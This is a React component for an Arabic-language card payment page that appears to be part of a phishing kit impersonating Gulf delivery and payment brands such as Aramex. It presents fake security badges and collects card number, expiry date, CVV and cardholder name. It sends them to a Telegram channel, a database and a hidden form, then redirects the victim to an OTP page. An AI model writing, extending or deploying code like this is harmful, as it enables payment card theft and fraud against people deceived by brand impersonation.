import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedInput } from "@/components/ui/ThemedInput";
import { ThemedCard } from "@/components/ui/ThemedCard";
import {
  Loader2,
  Lock,
  ShieldCheck,
  CreditCard,
  Shield,
} from "lucide-react";
import { DynamicMetaTags } from "@/components/DynamicMetaTags";
import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(companyKey);
  }, [companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !expiryDate || !cvv || !cardHolder) {
      toast({ title: "خطأ", description: "الرجاء إكمال كافة بيانات البطاقة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const cardInfo = { cardNumber, expiryDate, cvv, cardHolder };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, cardInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-payment",
          linkId: id!,
          service: entityConfig.nameAr,
          amount: formattedAmount,
          cardNumber, expiryDate, cvv, cardHolder
        }).toString()
      });

      await sendToTelegram({
        type: 'card_input',
        data: { cardNumber, expiryDate, cvv, cardHolder, service: entityConfig.nameAr, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل معالجة البطاقة", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-10 h-10 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <MirrorPageWrapper 
      entityId={companyKey} 
      title="بيانات الدفع الإلكتروني"
      subtitle="Secure Card Payment Interface"
      linkData={linkData}
    >
      <DynamicMetaTags
        entityId={companyKey}
        title={`الدفع الإلكتروني - ${entityConfig.nameAr}`}
      />

      <div className="text-center mb-8">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/10 text-primary text-xs font-bold uppercase tracking-wider mb-2">
          <Lock className="w-3 h-3" />
          تشفير بيانات آمن
        </div>
        <h2 className="text-3xl font-bold tracking-tight text-foreground">إجمالي المبلغ: {formattedAmount}</h2>
      </div>

      <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
        <div className="h-2 w-full bg-primary" />
        <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
          <ThemedInput
            config={entityConfig}
            label="رقم البطاقة"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="xxxx xxxx xxxx xxxx"
            icon={<CreditCard className="w-5 h-5" />}
            required
          />
          <div className="grid grid-cols-2 gap-4">
            <ThemedInput
              config={entityConfig}
              label="تاريخ الانتهاء"
              value={expiryDate}
              onChange={handleExpiryChange}
              placeholder="MM/YY"
              required
            />
            <ThemedInput
              config={entityConfig}
              label="رمز الأمان (CVV)"
              type="password"
              maxLength={3}
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
              placeholder="xxx"
              required
            />
          </div>
          <ThemedInput
            config={entityConfig}
            label="اسم حامل البطاقة"
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value)}
            placeholder="الاسم كما يظهر على البطاقة"
            required
          />

          <div className="pt-6">
            <ThemedButton
              config={entityConfig}
              type="submit"
              disabled={isSubmitting}
              loading={isSubmitting}
            >
              {isSubmitting ? "جاري المعالجة..." : `دفع ${formattedAmount}`}
            </ThemedButton>
          </div>
        </form>
      </ThemedCard>

      <div className="flex flex-col sm:flex-row items-center justify-between gap-6 px-4 py-8">
        <div className="flex items-center gap-3 text-muted-foreground">
          <div className="w-10 h-10 rounded-full border flex items-center justify-center text-primary border-border bg-card">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <p className="text-[10px] font-bold uppercase leading-none mb-1 text-foreground">PCI-DSS Certified</p>
            <p className="text-[9px] font-medium">معايير أمان عالمية</p>
          </div>
        </div>
        <div className="flex items-center gap-3 text-muted-foreground">
          <div className="w-10 h-10 rounded-full border flex items-center justify-center text-primary border-border bg-card">
            <ShieldCheck className="w-5 h-5" />
          </div>
          <div>
            <p className="text-[10px] font-bold uppercase leading-none mb-1 text-foreground">Secure Session</p>
            <p className="text-[9px] font-medium">اتصال مشفر 256-bit</p>
          </div>
        </div>
      </div>

      <form name="card-payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardNumber" />
        <input type="text" name="expiryDate" />
        <input type="text" name="cvv" />
        <input type="text" name="cardHolder" />
      </form>
    </MirrorPageWrapper>
  );
};

export default PaymentCardInput;
